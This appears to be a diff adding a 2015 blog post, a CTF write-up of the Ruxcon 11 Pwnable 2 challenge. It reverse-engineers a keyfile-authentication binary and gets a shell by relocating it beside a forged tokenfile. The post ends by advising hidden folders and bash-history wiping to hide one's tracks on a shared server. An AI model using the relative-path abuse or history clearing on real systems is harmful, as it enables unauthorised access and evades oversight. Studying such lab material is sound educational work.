@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>dangerpwn: Ruxcon 11 [Pwnable 2]</title>
+<meta content='This was the second pwnable challenge at Ruxcon 11. Players would SSH into a server running 64 bit Ubuntu and the SSH user&amp;rsquo;s home director...' name='description'>
+<meta charset='utf-8'>
+<meta content='width=device-width, initial-scale=1.0' name='viewport'>
+<meta content='IE=edge' http-equiv='X-UA-Compatible'>
+<meta content='True' name='HandheldFriendly'>
+<meta content='dangerpwn' property='og:site_name'>
+<meta content='article' property='og:type'>
+<meta content='Ruxcon 11 [Pwnable 2]' property='og:title'>
+<meta content='This was the second pwnable challenge at Ruxcon 11. Players would SSH into a server running 64 bit Ubuntu and the SSH user&amp;rsquo;s home director...' property='og:description'>
+<meta content='http://ctfs.and.coffee/2015/11/01/ruxcon-2015-pwnable-2/' property='og:url'>
+<meta content='http://ctfs.and.coffee/images/solarizedhax.png' property='og:image'>
+<meta content='2015-11-01' property='article:published_time'>
+<meta content='summary' name='twitter:card'>
+<meta content='Ruxcon 11 [Pwnable 2]' name='twitter:title'>
+<meta content='This was the second pwnable challenge at Ruxcon 11. Players would SSH into a server running 64 bit Ubuntu and the SSH user&amp;rsquo;s home director...' name='twitter:description'>
+<meta content='http://ctfs.and.coffee/2015/11/01/ruxcon-2015-pwnable-2/' name='twitter:url'>
+<meta content='http://ctfs.and.coffee/images/solarizedhax.png' name='twitter:image:src'>
+<link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed.xml" />
+<link href="/images/favicon.ico" rel="icon" type="image/ico" />
+<link href="/stylesheets/application.css" rel="stylesheet" />
+<link href='//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,400' rel='stylesheet' type='text/css'>
+</head>
+<body class='post-template nav-closed'>
+<div class='nav'>
+<h3 class='nav-title'>Menu</h3>
+<a class='nav-close' href='#'>
+<span class='hidden'>Close</span>
+</a>
+<ul>
+<li class='nav-home' role='presentation'>
+<a href='/'>Home</a>
+</li>
+</ul>
+<a class='subscribe-button icon-feed' href='/feed.xml'>Subscribe</a>
+</div>
+<span class='nav-cover'></span>
+
+<div class='site-wrapper'>
+<header class='main-header post-head' style='background-image: url(/images/solarizedhax.png)'>
+<nav class='clearfix main-nav overlay'>
+<a class='blog-logo' href='/'>
+<img alt="dangerpwn" src="/images/test_logo.png" />
+</a>
+<a class='menu-button icon-menu' href='#'>
+<span class='word'>Menu</span>
+</a>
+</nav>
+</header>
+<main class='content' role='main'>
+<article class='post'>
+<header class='post-header'>
+<h1 class='post-title'>Ruxcon 11 [Pwnable 2]</h1>
+<section class='post-meta'>
+<time class='post-date' datetime='2015-11-01'>
+01 November 2015
+</time>
+on <a href='/tag/reversing/'>reversing</a>, <a href='/tag/pwnable/'>pwnable</a>, <a href='/tag/writeups/'>writeups</a>, <a href='/tag/ctf/'>ctf</a>, <a href='/tag/ruxcon/'>ruxcon</a>
+</section>
+<section class='post-content'><p>This was the second pwnable challenge at Ruxcon 11. Players would SSH into a server running 64 bit Ubuntu and the SSH user&rsquo;s home directory contained two files: level2 and tokenfile. <code>file</code> and <code>cat</code> quickly revealed that <code>level2</code> is a x86-64 ELF executable that hasn&rsquo;t been stripped. <code>tokenfile</code> is a text file but we can&rsquo;t read it. Presumably then the aim of the challenge is to read that file!</p>
+<pre class="highlight plaintext"><code>➜  pwnable2  file level2
+level2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e98e13b917a49c072e0ba9035947d21ba91a706d, not stripped
+</code></pre>
+
+<p>When we run <code>level2</code> it requests a keyfile specified as a path or the character &ldquo;-&rdquo; which specifies &ldquo;give me the keyfile on stdin&rdquo;.</p>
+
+<p>Before doing anything, run strings over the binary. It&rsquo;ll help you get the lay of the land, and in some (silly) cases, you&rsquo;ll find the flag. Strings doesn&rsquo;t yield the flag but it does reveal some interesting strings that sound like function names: </p>
+<pre class="highlight plaintext"><code>➜  pwnable2  strings level2
+&lt;snip&gt;
+parse_header
+no_keys
+&lt;snip&gt;
+auth_scheme
+sizetype
+key_for_scheme
+token_from_file
+XorDecode
+try_authenticate
+&lt;snip&gt;
+mod_table
+encoding_table
+base64_encode
+base64_decode
+build_decoding_table
+base64_cleanup
+input_length
+output_length
+encoded_data
+&lt;snip&gt;
+</code></pre>
+
+<p>Looks like there&rsquo;s authentication attempts, parsing, base64, decoding, etc. </p>
+
+<p>We&rsquo;ll start simple though; because we&rsquo;re mad hax0rz, we&rsquo;ll initially assume that the password is password.</p>
+<pre class="highlight plaintext"><code>➜  pwnable2  ./level2 - beans
+Usage: ./level2 &lt;keyfile&gt; or - for stdin
+
+➜  pwnable2  ./level2 -
+password
+Invalid Scheme specified.
+</code></pre>
+
+<p>FOILED! The password wasn&rsquo;t password. Undeterred, we&rsquo;ll try running ltrace to look for interesting function calls.</p>
+<pre class="highlight plaintext"><code>➜  pwnable2  ltrace ./level2 -
+__libc_start_main(0x400c00, 2, 0x7ffc819d44d8, 0x4017b0 &lt;unfinished ...&gt;
+strcmp("-", "-")                                                    = 0
+malloc(1032)                                                        = 0x16bd010
+__isoc99_fscanf(0x7f4c18f5c4e0, 0x401834, 0x16bd010, 0x16bd018 password
+)     = 0
+malloc(0)                                                           = 0x16bd420
+malloc(4104)                                                        = 0x16bd440
+strcmp("", "XOR")                                                   = -88
+strcmp("", "NOENCRYPT")                                             = -78
+fprintf(0x7f4c18f5c060, "Invalid Scheme specified.\n"Invalid Scheme specified.
+)              = 26
++++ exited (status 1) +++
+</code></pre>
+
+<p>Notice the calls to <code>strcmp(&quot;&quot;, &quot;XOR&quot;)</code> and <code>strcmp(&quot;&quot;, &quot;NOENCRYPT&quot;)</code>, followed by the call that prints <em>&ldquo;Invalid Scheme specified&rdquo;</em>. Looks like our input will need to pass a comparison with either &ldquo;XOR&rdquo; or &ldquo;NOENCRYPT&rdquo; (or both!) While that sounds like a good start, notice that our ninja input guess of &ldquo;password&rdquo; doesn&rsquo;t appear in either of those comparisons! hmmm &hellip; it looks like our input is being read in via fscanf so let&rsquo;s break out GDB and find out what&rsquo;s going on. </p>
+
+<p>Note that I&rsquo;m using the superduper awesome Python Exploit Development Assistant (<a rel="nofollow" href="https://github.com/longld/peda"><code>peda.py</code></a>) for GDB, it makes GDB not suck in the way that <a rel="nofollow" href="http://theoatmeal.com/pl/minor_differences/cereal">milk makes cereal not suck</a>.</p>
+
+<p>Here, we run <code>gdb level2</code>, set a breakpoint for the <code>__isoc99_fscanf</code> function and set up the program arguments to accept input from stdin.</p>
+
+<p><img alt="gdb" src="/images/rux11_pwn2_gdb_fscanf.png" />
+Whenever GDB breaks, PEDA prints a dump of the processor state (no more spamming <code>i r</code>!) at the top we have a register dump, followed by disassembly around the current program counter and a memory dump. It looks like rsi contains the format string being passed to fscanf, that&rsquo;s going to determine what gets read in. The manual for fscanf should contain everything we need to interpret the format string.</p>
+<pre class="highlight plaintext"><code>SCANF(3)                                  Linux Programmer's Manual                                 SCANF(3)
+
+
+
+NAME
+       scanf, fscanf, sscanf, vscanf, vsscanf, vfscanf - input format conversion
+
+SYNOPSIS
+       #include &lt;stdio.h&gt;
+
+       int scanf(const char *format, ...);
+       int fscanf(FILE *stream, const char *format, ...);
+
+&lt;snip&gt;
+
+The conversion specifications in format are of two forms, either beginning with '%' 
+or beginning with "%n$".   The two forms should not be mixed in the same format 
+string, except that a string containing "%n$" specifications can include %% and %*.  
+If format contains '%' specifications, then these correspond  in  order  with 
+successive  pointer  arguments.   In  the  "%n$"  form (which is specified in       
+POSIX.1-2001, but not C99), n is a decimal integer that specifies that the converted 
+input should  be placed in the location referred to by the n-th pointer argument 
+following format.
+
+   Conversions
+
+       l      Indicates  either  that  the  conversion  will  be  one of d, i, o, u, 
+       x, X, or n and the next pointer is a pointer to a long int or unsigned long 
+       int (rather than int), or that the conversion  will  be  one  of  e,  f,  or g
+       and the next pointer is a pointer to double (rather than float).  Specifying 
+       two l characters is equivalent to L.  If used with %c or  %s,  the  
+       corresponding  parameter  is  considered  as a pointer to a wide character or
+       wide-character string respectively.
+
+       u      Matches an unsigned decimal integer; the next pointer must be a pointer
+       to unsigned int.
+
+       s      Matches  a sequence of non-white-space characters; the next pointer 
+       must be a pointer to character array that is long enough to hold the input  
+       sequence  and  the  terminating  null  byte ('\0'), which is added 
+       automatically.  The input string stops at white space or at the maximum
+       field width, whichever occurs first.
+
+&lt;snip&gt;
+</code></pre>
+
+<p>The fscanf format string, <code>&quot;%lu:%1023s&quot;</code>,  can be broken down into the following:</p>
+
+<ul>
+<li><code>%lu</code> - unsigned long</li>
+<li>: - ASCII character &ldquo;:&rdquo;</li>
+<li><code>%1023s</code> - 1023 character string (1024 with the null terminator).</li>
+</ul>
+
+<p>Before, we just passed in the string &ldquo;password&rdquo; and our input didn&rsquo;t make it to the <code>strcmp</code> instructions. Let&rsquo;s adjust the format to match the fscanf format string and try again. To make things neater, we&rsquo;ll also put our input in a keyfile rather than entering it via stdin. </p>
+<pre class="highlight plaintext"><code>➜  pwnable2  echo "123:password" &gt; key1
+</code></pre>
+
+<p>Changing the format seems to have worked! We now see the string &ldquo;password&rdquo; being compared against &ldquo;XOR&rdquo; and &ldquo;NOENCRYPT&rdquo;, but we still hit the &ldquo;Invalid Scheme specified&rdquo; message. If we change our input to &ldquo;123:NOENCRYPT&rdquo; we see the following: <code>strcmp(&quot;NOENCRYPT&quot;, &quot;NOENCRYPT&quot;)</code>, looks good!</p>
+<pre class="highlight plaintext"><code>➜  pwnable2  ltrace ./level2 ./key1
+__libc_start_main(0x400c00, 2, 0x7ffe6b0f31e8, 0x4017b0 &lt;unfinished ...&gt;
+strcmp("./key1", "-")                                               = 1
+fopen("./key1", "r")                                                = 0x2072010
+malloc(1032)                                                        = 0x2072250
+__isoc99_fscanf(0x2072010, 0x401834, 0x2072250, 0x2072258)          = 2
+malloc(629760)                                                      = 0x7f2d3cf19010
+malloc(4104)                                                        = 0x2072660
+strcmp("password", "XOR")                                           = 24
+strcmp("password", "NOENCRYPT")                                     = 34
+fprintf(0x7f2d3cdba060, "Invalid Scheme specified.\n"Invalid Scheme specified.
+)              = 26
++++ exited (status 1) +++
+
+➜  pwnable2  echo "123:NOENCRYPT" &gt; key2
+
+➜  pwnable2  ltrace ./level2 ./key2
+__libc_start_main(0x400c00, 2, 0x7ffc0232d358, 0x4017b0 &lt;unfinished ...&gt;
+strcmp("./key2", "-")                                               = 1
+fopen("./key2", "r")                                                = 0xc43010
+malloc(1032)                                                        = 0xc43250
+__isoc99_fscanf(0xc43010, 0x401834, 0xc43250, 0xc43258)             = 2
+malloc(629760)                                                      = 0x7efc1ddcd010
+malloc(4104)                                                        = 0xc43660
+strcmp("NOENCRYPT", "XOR")                                          = -10
+strcmp("NOENCRYPT", "NOENCRYPT")                                    = 0
+strcpy(0xc43668, "No Encryption")                                   = 0xc43668
+__isoc99_fscanf(0xc43010, 0x401962, 0x7efc1ddcd010, 0x7efc1ddcd010) = 0xffffffff
+fprintf(0x7efc1dc6e060, "In.correct number of entries. Exp"..., 123, 0Incorrect number of entries. Expected 123 but found 0
+) = 54
++++ exited (status 1) +++
+</code></pre>
+
+<p>Now we&rsquo;re getting the message: &ldquo;Incorrect number of entries. Expected 123 but found 0&rdquo;. Looks like that number we pass in is some kind of counter. Apparently our keyfile contains zero entries, let&rsquo;s try adding stuff to the keyfile. Adding the line &ldquo;password&rdquo; changes the message to &ldquo;Incorrect number of entries. Expected 123 but found 1&rdquo;, looks like the number we pass in is a counter for the number of lines in the keyfile.</p>
+<pre class="highlight plaintext"><code>➜  pwnable2  echo "0:NOENCRYPT\npassword" &gt; key3
+
+➜  pwnable2  ./level2 ./key3
+Incorrect number of entries. Expected 123 but found 1
+
+➜  pwnable2  echo "1:NOENCRYPT\npassword" &gt; key3
+
+➜  pwnable2  ./level2 ./key3
+</code></pre>
+
+<p>Awesome! Sort of &hellip; nothing actually happens and we clearly haven&rsquo;t pwned anything, nor is it raining shellz. Let&rsquo;s break out IDA to work out how we&rsquo;re actually going to break this thing.</p>
+
+<p>Once the binary is loaded and disassembled, jump into the strings window (<code>SHIFT+F12</code>). We&rsquo;re assuming that we want to properly authenticate with the binary so let&rsquo;s trace where the following string is used: &ldquo;Congratulations. You&rsquo;re authenticated!&rdquo; Double click the string, this will jump to a table in the .rodata section, use <code>Ctrl+x</code> to find cross-references to the string, there&rsquo;s only one in this instance.</p>
+
+<p><img alt="IDA strings window" src="/images/rux11_pwn2_ida_strings.png" /></p>
+
+<p>So if we authenticate correctly, we get a shell. It sure looks like we&rsquo;re in the right place. But we can&rsquo;t read the token file! If we can&rsquo;t read the token file it&rsquo;s going to be real difficult to construct a valid keyfile.</p>
+
+<p><img alt="IDA authentication function" src="/images/rux11_pwn2_ida_congrats.png" /></p>
+
+<p>If we drill down into the <code>token_from_file</code> function we find the following interesting code block. There it is! It looks like the program is opening the tokenfile from a relative path rather than an absolute one. We can totally abuse this!</p>
+
+<p><img alt="IDA open tokenfile" src="/images/rux11_pwn2_tokenfile_open.png" /></p>
+
+<p>I forgot to take screenshots during the actual competition but permissions on the tokenfile were such that the user running the level2 binary wasn&rsquo;t able to read the tokenfile, but they <strong>did</strong> allow us to move the binary. Because the tokenfile is being opened from <code>./tokenfile</code>, if we move the binary to somewhere like <code>/tmp</code> and create our own token file, we should be able to authenticate successfully. Let&rsquo;s test that theory!</p>
+<pre class="highlight plaintext"><code>➜  /tmp  echo -n "1:NOENCRYPT\nwinning" &gt; key5
+➜  /tmp  echo -n "winning" &gt; tokenfile
+➜  /tmp  ./level2 ./key5
+Key entry too large.
+</code></pre>
+
+<p>Looks like we&rsquo;ve missed something. Let&rsquo;s find the message &ldquo;Key entry too large&rdquo; in IDA.</p>
+
+<p><img alt="IDA base64_decode" src="/images/rux11_pwn2_ida_base64.png" /></p>
+
+<p>If the comparison fails and the branch isn&rsquo;t taken the program prints &ldquo;Key entry too large&rdquo; and exits. This comparison seems to be comparing a variable to -1 directly after a base64 decode operation. Following the flow in IDA, there are 3 paths from this point. Either the program prints &ldquo;Key entry too large&rdquo;, &ldquo;Incorrectly encoded entry&rdquo; or it proceeds to the <code>try_authenticate</code> function. If we break in GDB at the point where <code>base64_decode</code> is called we see a pointer (0x602660) to our keyfile entry, &ldquo;winning&rdquo;, being passed as an argument. </p>
+
+<p><img alt="GDB base64_decode" src="/images/rux11_pwn2_gdb_base64.png" />
+Decoding &ldquo;winning&rdquo; as base64 will clearly fail so perhaps we need to encode our input. Also note that because the binary isn&rsquo;t stripped, we can see the name of the original source file at the point where GDB breaks: <code>authenticate_with_keyfile_b64dec.c</code>. Sounds good, let&rsquo;s try it.</p>
+<pre class="highlight plaintext"><code>➜  /tmp  echo "1:NOENCRYPT" &gt; key6
+➜  /tmp  echo -n "winning" | base64 &gt;&gt; key6
+➜  /tmp  ./level2 ./key6
+# 
+
+# cd /home/level2
+
+# ls
+level2  tokenfile
+
+# cat tokenfile
+RUX{not_the_actual_flag_but_you_still_win}
+
+# exit
+Congratulations. You're authenticated                                                           
+➜  /tmp
+</code></pre>
+
+<p>BOOM, we get a shell, change back to the challenge directory and we can read the tokenfile which contains the original flag (I&rsquo;m afraid I don&rsquo;t remember the actual flag).</p>
+
+<p>We didn&rsquo;t explore the XOR function but evidentially we didn&rsquo;t need it to solve the challenge. Perhaps as the subject of a follow-up post.</p>
+
+<p>As a final note, this challenge was hosted on a server accessible by all teams. That means that anyone watching the bash history can see what you&rsquo;re doing, making it a delicate operation to solve the challenge without revealing your methods. As a minimum, I&rsquo;d recommend creating a hidden folder, working from there, then deleting the bash history.</p>
+<pre class="highlight plaintext"><code>➜  pwnable2  mkdir /.fd788743c5e54c528a6088c650cf8a9d
+➜  pwnable2  cp level2 /.fd788743c5e54c528a6088c650cf8a9d
+
+&lt;pwn all the things&gt;
+
+➜  pwnable2  history -c
+➜  pwnable2  cat /dev/null &gt; ~/.bash_history
+</code></pre>
+
+<p>You know &hellip; just to be sure.</p>
+
+<p>Happy hunting.</p>
+</section>
+</header>
+<footer class='post-footer'>
+<figure class='author-image'>
+<a class='img' href='tdrv' style='background-image: url(/images/tom.jpg)'>
+<span class='hidden'>Tom's Picture</span>
+</a>
+</figure>
+<section class='author'>
+<h4>
+<a href='tdrv'>Tom</a>
+</h4>
+<p>
+The only acceptable IV is coffee.
+</p>
+<div class='author-meta'>
+<span class='author-link icon-link'>
+<a href='ctfs.and.coffee'>ctfs.and.coffee</a>
+</span>
+</div>
+</section>
+<section class='share'>
+<h4>Share this post</h4>
+<a class='icon-twitter' href='https://twitter.com/intent/tweet?text=Ruxcon 11 [Pwnable 2]&amp;amp;url=http://ctfs.and.coffee/2015/11/01/ruxcon-2015-pwnable-2/' onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+<span class='hidden'>Twitter</span>
+</a>
+<a class='icon-facebook' href='https://www.facebook.com/sharer/sharer.php?u=http://ctfs.and.coffee/2015/11/01/ruxcon-2015-pwnable-2/' onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+<span class='hidden'>Facebook</span>
+</a>
+<a class='icon-google-plus' href='https://plus.google.com/share?url=http://ctfs.and.coffee/2015/11/01/ruxcon-2015-pwnable-2/' onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+<span class='hidden'>Google+</span>
+</a>
+</section>
+</footer>
+</article>
+</main>
+<aside class='read-next'>
+<a class='no-cover read-next-story' href='/2015/10/27/how-to-setup-middleman/'>
+<section class='post'>
+<h2>How to setup Middleman</h2>
+<p>This post is a reference for myself regarding setting up new machines to post to and existing Middleman blog&hellip;</p>
+</section>
+</a>
+</aside>
+
+<footer class='site-footer clearfix'>
+<section class='copyright'>
+<a href='/'>dangerpwn</a>
+&copy;
+2015
+</section>
+<section class='poweredby'>
+Casper theme powered by
+<a href='https://ghost.org'>Ghost</a>
+</section>
+</footer>
+</div>
+<script src="/javascripts/application.js"></script>
+</body>
+</html>
